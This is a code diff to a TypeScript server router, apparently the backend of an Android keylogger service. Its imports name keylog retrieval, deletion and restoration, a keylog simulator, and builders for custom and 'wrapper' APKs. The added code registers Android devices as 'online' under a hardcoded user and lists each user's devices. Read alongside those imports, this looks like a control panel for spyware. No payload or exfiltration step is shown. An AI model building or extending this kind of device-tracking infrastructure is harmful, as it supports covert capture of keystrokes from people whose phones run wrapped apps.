@@ -8,7 +8,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs } from "./db";
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildCustomAPK } from "./apk-builder";
 import { generateAPKWrapper } from "./apk-wrapper-generator";
@@ -196,22 +196,53 @@ export const appRouter = router({
         deviceModel: z.string(),
         androidVersion: z.string(),
         appName: z.string(),
+        appUrl: z.string().optional(),
         appVersion: z.string(),
       }))
       .mutation(async ({ input }) => {
         try {
-          console.log('Dispositivo registrado:', input);
+          console.log('[Devices] Registrando dispositivo:', input);
+          
+          const device = await registerDevice({
+            deviceId: input.deviceId,
+            userId: 1,
+            appName: input.appName,
+            appUrl: input.appUrl || '',
+            deviceModel: input.deviceModel,
+            androidVersion: input.androidVersion,
+            appVersion: input.appVersion,
+            status: 'online',
+          });
           
           return {
             success: true,
             message: 'Dispositivo registrado com sucesso',
             deviceId: input.deviceId,
+            device,
           };
         } catch (error) {
-          console.error('Erro ao registrar dispositivo:', error);
+          console.error('[Devices] Erro ao registrar dispositivo:', error);
           throw new TRPCError({
             code: 'INTERNAL_SERVER_ERROR',
             message: 'Erro ao registrar dispositivo',
+          });
+        }
+      }),
+    
+    list: protectedProcedure
+      .query(async ({ ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
+        }
+        
+        try {
+          const devices = await getDevicesByUser(ctx.user.id);
+          return devices;
+        } catch (error) {
+          console.error('[Devices] Erro ao listar dispositivos:', error);
+          throw new TRPCError({
+            code: 'INTERNAL_SERVER_ERROR',
+            message: 'Erro ao listar dispositivos',
           });
         }
       }),
